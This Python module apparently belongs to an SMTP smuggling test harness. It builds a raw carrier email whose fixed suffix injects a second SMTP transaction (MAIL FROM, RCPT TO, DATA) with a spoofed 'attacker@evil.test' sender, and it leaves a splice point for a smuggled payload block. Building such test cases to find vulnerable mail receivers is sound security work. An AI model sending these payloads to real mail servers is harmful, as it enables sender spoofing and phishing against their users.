"""Carrier email template. Builds a byte-accurate RFC 5322-ish message
with a splice point for a smuggled payload block. Never uses str.format
or str.replace on the smuggled block — those can mutate line endings or
reject null bytes."""
from __future__ import annotations

import uuid


_TEMPLATE_PREFIX = (
    b"From: {FROM}\r\n"
    b"To: {TO}\r\n"
    b"Subject: Carrier email for smuggling test case\r\n"
    b"Message-ID: <{MSGID}@labnet.test>\r\n"
    b"MIME-Version: 1.0\r\n"
    b"Content-Type: text/plain; charset=us-ascii\r\n"
    b"\r\n"
    b"This is the body of the legitimate carrier email.\r\n"
    b"The smuggled payload block follows this line:\r\n"
)
_TEMPLATE_SUFFIX = (
    b"This is the trailing content that a non-vulnerable receiver would\r\n"
    b"consider part of the carrier body. A vulnerable receiver parses it\r\n"
    b"as the start of a second, smuggled email.\r\n"
    b"MAIL FROM:<attacker@evil.test>\r\n"
    b"RCPT TO:<bob@labnet.test>\r\n"
    b"DATA\r\n"
    b"From: attacker@evil.test\r\n"
    b"To: bob@labnet.test\r\n"
    b"Subject: SMUGGLED MESSAGE\r\n"
    b"\r\n"
    b"If you can read this as a separate email, the receiver is vulnerable.\r\n"
    b".\r\n"
)


def build_carrier(
    envelope_from: str,
    envelope_to: str,
    smuggled_block: bytes,
) -> bytes:
    """Assemble the carrier email as raw bytes, splicing the smuggled
    block in as raw bytes with zero mutation."""
    msgid = uuid.uuid4().hex
    prefix = (
        _TEMPLATE_PREFIX
        .replace(b"{FROM}", envelope_from.encode("ascii"))
        .replace(b"{TO}", envelope_to.encode("ascii"))
        .replace(b"{MSGID}", msgid.encode("ascii"))
    )
    return prefix + smuggled_block + _TEMPLATE_SUFFIX
